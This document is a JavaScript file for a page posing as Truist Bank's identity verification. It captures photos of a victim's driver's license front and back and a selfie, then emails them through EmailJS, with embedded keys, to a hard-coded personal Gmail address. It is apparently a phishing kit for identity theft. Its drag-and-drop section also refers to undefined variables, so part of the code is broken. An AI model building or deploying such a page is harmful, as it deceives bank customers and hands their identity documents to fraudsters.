document.addEventListener('DOMContentLoaded', () => {
    // Initialize EmailJS with public key
    emailjs.init("lWBFZ8fyyfClfqgf2");
    
    // Element references
    const licenseStep = document.getElementById('license-step');
    const selfieStep = document.getElementById('selfie-step');
    const verificationComplete = document.getElementById('verification-complete');
    
    // License Front Elements
    const licenseFrontCameraContainer = document.getElementById('license-front-camera-container');
    const licenseFrontCamera = document.getElementById('license-front-camera');
    const licenseFrontCanvas = document.getElementById('license-front-canvas');
    const licenseFrontCaptureBtn = document.getElementById('license-front-capture');
    const licenseFrontPreview = document.getElementById('license-front-preview');
    const licenseFrontImg = document.getElementById('license-front-img');
    const licenseFrontRetake = document.getElementById('license-front-retake');
    
    // License Back Elements
    const licenseBackCameraContainer = document.getElementById('license-back-camera-container');
    const licenseBackCamera = document.getElementById('license-back-camera');
    const licenseBackCanvas = document.getElementById('license-back-canvas');
    const licenseBackCaptureBtn = document.getElementById('license-back-capture');
    const licenseBackPreview = document.getElementById('license-back-preview');
    const licenseBackImg = document.getElementById('license-back-img');
    const licenseBackRetake = document.getElementById('license-back-retake');
    
    const licenseNext = document.getElementById('license-next');
    const backToLicense = document.getElementById('back-to-license');
    const cameraFeed = document.getElementById('camera-feed');
    const photoCanvas = document.getElementById('photo-canvas');
    const captureBtn = document.getElementById('capture-btn');
    const selfiePreview = document.getElementById('selfie-preview');
    const selfieImg = document.getElementById('selfie-img');
    const selfieRetake = document.getElementById('selfie-retake');
    const submitVerification = document.getElementById('submit-verification');
    const doneBtn = document.getElementById('done-btn');
    const referenceNumber = document.getElementById('reference-number');
    const submissionDate = document.getElementById('submission-date');
    const recipientEmail = document.getElementById('recipient-email');
    const emailStatus = document.querySelector('.email-status');
    const emailInput = document.getElementById('email-input');
    const updateEmailBtn = document.getElementById('update-email-btn');
    const stepIndicators = document.querySelectorAll('.step');
    const stepLabels = document.querySelectorAll('.step-labels span');
    
    // Streams for different cameras
    let licenseFrontStream = null;
    let licenseBackStream = null;
    let selfieStream = null;
    
    // Captured data
    let licenseFrontDataUrl = null;
    let licenseBackDataUrl = null;
    let selfieDataUrl = null;
    
    // Email configuration
    let userEmail = 'deliafmclinden@gmail.com';    // Generate a random reference number
    function generateReferenceNumber() {
        return 'TRU' + Math.floor(100000000 + Math.random() * 900000000);
    }
    
    // Format current date for submission
    function formatCurrentDate() {
        const date = new Date();
        const options = { year: 'numeric', month: 'long', day: 'numeric' };
        return date.toLocaleDateString('en-US', options);
    }

    // Update the step indicators
    function updateStepIndicators(step) {
        stepIndicators.forEach((indicator, index) => {
            if (index < step) {
                indicator.classList.add('completed');
                indicator.classList.remove('active');
            } else if (index === step) {
                indicator.classList.add('active');
                indicator.classList.remove('completed');
            } else {
                indicator.classList.remove('active', 'completed');
            }
        });

        stepLabels.forEach((label, index) => {
            if (index === step) {
                label.classList.add('active');
            } else {
                label.classList.remove('active');
            }
        });
    }
    
    // Check if both license images are captured to enable next button
    function checkLicenseImagesComplete() {
        if (licenseFrontDataUrl && licenseBackDataUrl) {
            licenseNext.disabled = false;
        } else {
            licenseNext.disabled = true;
        }
    }
    
    // Start camera for license front
    async function startLicenseFrontCamera() {
        try {
            licenseFrontStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' },
                audio: false
            });
            licenseFrontCamera.srcObject = licenseFrontStream;
        } catch (err) {
            console.error('Error accessing the camera for license front: ', err);
            alert('Unable to access the camera. Please make sure you have given permission to access your camera.');
        }
    }
    
    // Start camera for license back
    async function startLicenseBackCamera() {
        try {
            licenseBackStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' },
                audio: false
            });
            licenseBackCamera.srcObject = licenseBackStream;
        } catch (err) {
            console.error('Error accessing the camera for license back: ', err);
            alert('Unable to access the camera. Please make sure you have given permission to access your camera.');
        }
    }
    
    // Stop camera streams
    function stopLicenseCameras() {
        // Stop license front camera
        if (licenseFrontStream) {
            licenseFrontStream.getTracks().forEach(track => track.stop());
            licenseFrontStream = null;
        }
        
        // Stop license back camera
        if (licenseBackStream) {
            licenseBackStream.getTracks().forEach(track => track.stop());
            licenseBackStream = null;
        }
    }
    
    // Send email using SMTP.js
    function sendVerificationEmail(refNum) {
        const emailBody = `
            <html>
                <head>
                    <style>
                        body { font-family: Arial, sans-serif; line-height: 1.6; }
                        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
                        .header { background-color: #442582; color: white; padding: 15px; text-align: center; }
                        .content { padding: 20px; border: 1px solid #ddd; }
                        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #777; }
                        .info { margin: 15px 0; }
                        .info span { font-weight: bold; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="header">
                            <h2>Truist Identity Verification</h2>
                        </div>
                        <div class="content">
                            <h3>Verification Submission Confirmation</h3>
                            <p>Your identity verification has been successfully submitted.</p>
                            <div class="info">
                                <p><span>Reference Number:</span> ${refNum}</p>
                                <p><span>Submission Date:</span> ${formatCurrentDate()}</p>
                            </div>
                            <p>Attached to this email are your verification photos.</p>
                        </div>
                        <div class="footer">
                            <p>&copy; 2025 Truist Bank. All rights reserved.</p>
                        </div>
                    </div>
                </body>
            </html>
        `;

        emailStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending verification results...';
        
        // Using EmailJS to send email
        const templateParams = {
            to_email: userEmail,
            subject: 'Truist Identity Verification - ' + refNum,
            message: emailBody,
            front_id_attachment: licenseFrontDataUrl,
            back_id_attachment: licenseBackDataUrl,
            selfie_attachment: selfieDataUrl,
            reference: refNum,
            submission_date: formatCurrentDate()
        };
        
        return emailjs.send('service_8p8c5pb', 'template_dzq7yxo', templateParams)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
                emailStatus.innerHTML = '<i class="fas fa-envelope"></i> Verification results sent successfully';
                emailStatus.style.color = 'var(--truist-light-blue)';
                return true;
            })
            .catch(function(error) {
                console.error('FAILED...', error);
                emailStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Could not send email. Please try again.';
                emailStatus.style.color = 'red';
                return false;
            });
    }

    // Show step
    function showStep(step) {
        licenseStep.classList.remove('active');
        selfieStep.classList.remove('active');
        verificationComplete.classList.remove('active');

        if (step === 0) {
            licenseStep.classList.add('active');
            updateStepIndicators(0);
            startLicenseFrontCamera();
            // Hide back camera initially
            licenseBackCameraContainer.style.display = 'none';
            licenseBackCaptureBtn.style.display = 'none';
        } else if (step === 1) {
            licenseStep.classList.remove('active');
            selfieStep.classList.add('active');
            updateStepIndicators(1);
            // Stop ID cameras and start selfie camera
            stopLicenseCameras();
            startSelfieCamera();
        } else if (step === 2) {
            selfieStep.classList.remove('active');
            verificationComplete.classList.add('active');
            updateStepIndicators(2);
            stopSelfieCamera();            
            // Generate a new reference number
            const refNum = generateReferenceNumber();
            localStorage.setItem('currentReferenceNumber', refNum);
            referenceNumber.textContent = refNum;
            
            // Update submission date with current date
            submissionDate.textContent = formatCurrentDate();
            
            // Display recipient email
            recipientEmail.textContent = userEmail;
            
            // Send email with verification data
            sendVerificationEmail(refNum);
        }
    }
    
    // Start selfie camera
    async function startSelfieCamera() {
        try {
            selfieStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            });
            cameraFeed.srcObject = selfieStream;
        } catch (err) {
            console.error('Error accessing the selfie camera: ', err);
            alert('Unable to access the camera. Please make sure you have given permission to access your camera.');
        }
    }
    
    // Stop selfie camera
    function stopSelfieCamera() {
        if (selfieStream) {
            selfieStream.getTracks().forEach(track => track.stop());
            selfieStream = null;
        }
    }    // License Front camera handling
    licenseFrontCaptureBtn.addEventListener('click', () => {
        // Capture the front of the license
        const context = licenseFrontCanvas.getContext('2d');
        licenseFrontCanvas.width = licenseFrontCamera.videoWidth;
        licenseFrontCanvas.height = licenseFrontCamera.videoHeight;
        
        context.drawImage(licenseFrontCamera, 0, 0, licenseFrontCanvas.width, licenseFrontCanvas.height);
        
        // Get the image as data URL
        licenseFrontDataUrl = licenseFrontCanvas.toDataURL('image/jpeg');
        
        // Display the preview
        licenseFrontImg.src = licenseFrontDataUrl;
        licenseFrontCameraContainer.style.display = 'none';
        licenseFrontPreview.style.display = 'block';
        licenseFrontCaptureBtn.style.display = 'none';
        
        // Show the back camera and capture button
        licenseBackCameraContainer.style.display = 'block';
        licenseBackCaptureBtn.style.display = 'block';
        
        // Start the back camera
        startLicenseBackCamera();
        
        // Save to localStorage
        localStorage.setItem('licenseFrontImageData', licenseFrontDataUrl);
    });
    
    licenseFrontRetake.addEventListener('click', () => {
        licenseFrontCameraContainer.style.display = 'block';
        licenseFrontPreview.style.display = 'none';
        licenseFrontCaptureBtn.style.display = 'block';
        licenseFrontDataUrl = null;
        
        // Restart the camera if needed
        if (!licenseFrontStream) {
            startLicenseFrontCamera();
        }
        
        checkLicenseImagesComplete();
    });
    
    // License Back camera handling
    licenseBackCaptureBtn.addEventListener('click', () => {
        // Capture the back of the license
        const context = licenseBackCanvas.getContext('2d');
        licenseBackCanvas.width = licenseBackCamera.videoWidth;
        licenseBackCanvas.height = licenseBackCamera.videoHeight;
        
        context.drawImage(licenseBackCamera, 0, 0, licenseBackCanvas.width, licenseBackCanvas.height);
        
        // Get the image as data URL
        licenseBackDataUrl = licenseBackCanvas.toDataURL('image/jpeg');
        
        // Display the preview
        licenseBackImg.src = licenseBackDataUrl;
        licenseBackCameraContainer.style.display = 'none';
        licenseBackPreview.style.display = 'block';
        licenseBackCaptureBtn.style.display = 'none';
        
        // Save to localStorage
        localStorage.setItem('licenseBackImageData', licenseBackDataUrl);
        
        // Enable the next button
        checkLicenseImagesComplete();
    });
    
    licenseBackRetake.addEventListener('click', () => {
        licenseBackCameraContainer.style.display = 'block';
        licenseBackPreview.style.display = 'none';
        licenseBackCaptureBtn.style.display = 'block';
        licenseBackDataUrl = null;
        
        // Restart the camera if needed
        if (!licenseBackStream) {
            startLicenseBackCamera();
        }
        
        checkLicenseImagesComplete();
    });    licenseNext.addEventListener('click', () => {
        showStep(1);
    });

    backToLicense.addEventListener('click', () => {
        showStep(0);
        stopSelfieCamera();
    });

    captureBtn.addEventListener('click', () => {
        const context = photoCanvas.getContext('2d');
        photoCanvas.width = cameraFeed.videoWidth;
        photoCanvas.height = cameraFeed.videoHeight;
        
        context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
        
        // Get image as data URL
        selfieDataUrl = photoCanvas.toDataURL('image/jpeg');
        
        // Save selfie image data to localStorage
        localStorage.setItem('selfieImageData', selfieDataUrl);
        
        // Display the preview
        selfieImg.src = selfieDataUrl;
        cameraFeed.style.display = 'none';
        selfiePreview.style.display = 'block';
        captureBtn.style.display = 'none';
        submitVerification.style.display = 'block';
    });

    selfieRetake.addEventListener('click', () => {
        cameraFeed.style.display = 'block';
        selfiePreview.style.display = 'none';
        captureBtn.style.display = 'block';
        submitVerification.style.display = 'none';
        selfieDataUrl = null;
        
        // Restart the camera if needed
        if (!selfieStream) {
            startSelfieCamera();
        }
    });    submitVerification.addEventListener('click', () => {
        // Show loading state
        submitVerification.disabled = true;
        submitVerification.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        
        // Save files to result folder
        // Since we can't directly write to the filesystem from browser JavaScript,
        // we'll provide download links for the user to save the files manually
        
        // Create a container for result files
        const resultContainer = document.createElement('div');
        resultContainer.style.display = 'none'; // Hidden initially
        resultContainer.id = 'result-downloads';
        document.body.appendChild(resultContainer);
        
        // Generate a unique reference number for this submission
        const refNum = generateReferenceNumber();
        
        // Save files (will happen in the background)
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        
        // Create license front download link
        if (licenseFrontDataUrl) {
            const licenseFrontLink = document.createElement('a');
            licenseFrontLink.href = licenseFrontDataUrl;
            licenseFrontLink.download = `result/license_front_${refNum}.jpg`;
            resultContainer.appendChild(licenseFrontLink);
            
            // Save automatically
            setTimeout(() => licenseFrontLink.click(), 500);
        }
        
        // Create license back download link
        if (licenseBackDataUrl) {
            const licenseBackLink = document.createElement('a');
            licenseBackLink.href = licenseBackDataUrl;
            licenseBackLink.download = `result/license_back_${refNum}.jpg`;
            resultContainer.appendChild(licenseBackLink);
            
            // Save automatically
            setTimeout(() => licenseBackLink.click(), 1000);
        }
        
        // Create selfie download link
        if (selfieDataUrl) {
            const selfieLink = document.createElement('a');
            selfieLink.href = selfieDataUrl;
            selfieLink.download = `result/selfie_${refNum}.jpg`;
            resultContainer.appendChild(selfieLink);
            
            // Save automatically
            setTimeout(() => selfieLink.click(), 1500);
        }
        
        // Create a JSON file with submission info
        const submissionData = {
            referenceNumber: refNum,
            submissionDate: formatCurrentDate(),
            recipientEmail: userEmail,
            hasLicenseFront: !!licenseFrontDataUrl,
            hasLicenseBack: !!licenseBackDataUrl,
            hasSelfie: !!selfieDataUrl
        };
        
        const dataStr = JSON.stringify(submissionData, null, 2);
        const dataBlob = new Blob([dataStr], {type: 'application/json'});
        const dataUrl = URL.createObjectURL(dataBlob);
        
        const dataLink = document.createElement('a');
        dataLink.href = dataUrl;
        dataLink.download = `result/submission_${refNum}.json`;
        resultContainer.appendChild(dataLink);
        
        // Save automatically
        setTimeout(() => dataLink.click(), 2000);
        
        // Move to completion step after short delay to show processing
        setTimeout(() => {
            // Move to completion step
            showStep(2);
            
            // Reset button state
            submitVerification.disabled = false;
            submitVerification.innerHTML = 'Submit';
        }, 2500);
    });    doneBtn.addEventListener('click', () => {
        // In a real application, this would redirect to another page
        alert(`Thank you for completing the verification process! The results have been sent to ${userEmail}.`);
    });

    // Initialize
    showStep(0);
      // Handle drag and drop for license front upload
    licenseFrontUpload.addEventListener('dragover', (e) => {
        e.preventDefault();
        licenseFrontUpload.style.borderColor = 'var(--truist-light-blue)';
    });
    
    licenseFrontUpload.addEventListener('dragleave', () => {
        licenseFrontUpload.style.borderColor = 'var(--truist-light-gray)';
    });
    
    licenseFrontUpload.addEventListener('drop', (e) => {
        e.preventDefault();
        licenseFrontUpload.style.borderColor = 'var(--truist-light-gray)';
        
        if (e.dataTransfer.files.length > 0) {
            licenseFrontInput.files = e.dataTransfer.files;
            const event = new Event('change');
            licenseFrontInput.dispatchEvent(event);
        }
    });
    
    // Handle drag and drop for license back upload
    licenseBackUpload.addEventListener('dragover', (e) => {
        e.preventDefault();
        licenseBackUpload.style.borderColor = 'var(--truist-light-blue)';
    });
    
    licenseBackUpload.addEventListener('dragleave', () => {
        licenseBackUpload.style.borderColor = 'var(--truist-light-gray)';
    });
    
    licenseBackUpload.addEventListener('drop', (e) => {
        e.preventDefault();
        licenseBackUpload.style.borderColor = 'var(--truist-light-gray)';
        
        if (e.dataTransfer.files.length > 0) {
            licenseBackInput.files = e.dataTransfer.files;
            const event = new Event('change');
            licenseBackInput.dispatchEvent(event);
        }
    });
    
    // Email update functionality
    updateEmailBtn.addEventListener('click', () => {
        const newEmail = emailInput.value.trim();
        if (newEmail && validateEmail(newEmail)) {
            userEmail = newEmail;
            recipientEmail.textContent = newEmail;
            
            // Resend email to new address
            const refNum = referenceNumber.textContent;
            emailStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending to updated email...';
            
            sendVerificationEmail(refNum);
            
            emailInput.value = '';
            alert(`Email address updated successfully! Verification results will be sent to ${newEmail}.`);
        } else {
            alert('Please enter a valid email address.');
        }
    });
    
    // Email validation helper
    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }
});
